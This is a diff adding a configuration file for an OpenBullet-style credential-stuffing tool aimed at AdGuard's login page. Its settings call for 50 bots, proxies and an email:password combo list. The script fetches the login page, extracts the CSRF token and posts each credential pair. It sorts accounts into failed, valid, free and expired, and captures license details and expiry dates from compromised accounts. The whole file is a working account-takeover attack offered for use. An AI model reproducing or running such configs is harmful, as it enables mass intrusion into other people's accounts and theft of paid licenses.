@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "adguard",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-03T18:05:06.5992391-04:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_LOGIN REQUEST GET "https://auth.adguard.com/login.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=_csrf]" "value" -> VAR "csrf" "_csrf=" "" 
+
+#POST_LOGIN REQUEST POST "https://auth.adguard.com/login" 
+  CONTENT "username=<USER>&password=<PASS>&<csrf>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, unrecognized username or password" 
+  KEYCHAIN Success OR 
+    KEY "My Account" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Currently you don&#039;t have any license" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Account is not confirmed" 
+
+#PARSE_LICENSE PARSE "<SOURCE>" LR "class=\"table__desktop-content\">" "</span>" Recursive=TRUE -> CAP "LICENSE" 
+
+#PARSE_DATE PARSE "<SOURCE>" LR "table__td--status\">" "</div>" Recursive=TRUE -> CAP "DATE" 
+
